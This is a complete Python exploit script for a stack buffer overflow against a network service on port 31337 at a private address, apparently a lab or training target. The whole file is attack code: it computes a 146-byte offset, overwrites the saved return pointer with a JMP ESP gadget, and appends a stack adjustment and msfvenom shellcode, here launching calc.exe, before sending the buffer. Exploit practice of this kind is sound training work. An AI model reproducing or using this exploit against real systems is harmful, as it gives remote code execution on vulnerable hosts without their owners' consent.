#!/usr/bin/env python
import socket
import struct

# target --
RHOST = "192.168.0.139"
RPORT = 31337

# create socket --
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# total buf(len)
# offset from mona! / msf-pattern-offeset
buf_totalen = 1024
offset_srp = 146 

# prtr_jmp_esp
# from: !mona jmp -r esp -cpb "\x00\x0A"
ptr_jmp_esp = 0x080414c3

# sub esp 10 --
# metasm > sub esp,0x10                                                                                                                                    
# "\x83\xec\x10"
sub_esp_10 = "\x83\xec\x10"

# msfvenom -p windows/exec -b '\x00\x0A' -f python -v sc CMD=calc.exe EXITFUNC=thread
sc =  ""                                                                                                                                                 
sc += "\xb8\xab\xf7\x10\x25\xda\xda\xd9\x74\x24\xf4\x5e\x33"                                                                                             
sc += "\xc9\xb1\x31\x31\x46\x13\x83\xc6\x04\x03\x46\xa4\x15"                                                                                             
sc += "\xe5\xd9\x52\x5b\x06\x22\xa2\x3c\x8e\xc7\x93\x7c\xf4"                                                                                             
sc += "\x8c\x83\x4c\x7e\xc0\x2f\x26\xd2\xf1\xa4\x4a\xfb\xf6"                                                                                             
sc += "\x0d\xe0\xdd\x39\x8e\x59\x1d\x5b\x0c\xa0\x72\xbb\x2d"                                                                                             
sc += "\x6b\x87\xba\x6a\x96\x6a\xee\x23\xdc\xd9\x1f\x40\xa8"                                                                                             
sc += "\xe1\x94\x1a\x3c\x62\x48\xea\x3f\x43\xdf\x61\x66\x43"                                                                                             
sc += "\xe1\xa6\x12\xca\xf9\xab\x1f\x84\x72\x1f\xeb\x17\x53"                                                                                             
sc += "\x6e\x14\xbb\x9a\x5f\xe7\xc5\xdb\x67\x18\xb0\x15\x94"                                                                                             
sc += "\xa5\xc3\xe1\xe7\x71\x41\xf2\x4f\xf1\xf1\xde\x6e\xd6"                                                                                             
sc += "\x64\x94\x7c\x93\xe3\xf2\x60\x22\x27\x89\x9c\xaf\xc6"                                                                                             
sc += "\x5e\x15\xeb\xec\x7a\x7e\xaf\x8d\xdb\xda\x1e\xb1\x3c"                                                                                             
sc += "\x85\xff\x17\x36\x2b\xeb\x25\x15\x21\xea\xb8\x23\x07"                                                                                             
sc += "\xec\xc2\x2b\x37\x85\xf3\xa0\xd8\xd2\x0b\x63\x9d\x3d"                                                                                             
sc += "\xee\xa6\xeb\xd5\xb7\x22\x56\xb8\x47\x99\x94\xc5\xcb"                                                                                             
sc += "\x28\x64\x32\xd3\x58\x61\x7e\x53\xb0\x1b\xef\x36\xb6"                                                                                             
sc += "\x88\x10\x13\xd5\x4f\x83\xff\x34\xea\x23\x65\x49" 

# assemble payload --
buf = ""
buf += "A"*(offset_srp - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp)	# SRP overwrite
buf += sub_esp_10 # ESP points here 
buf += sc # calc payload
buf += "D"*(buf_totalen - len(buf))	#trailing padding
buf += "\n"

# send the buffer --
s.send(buf)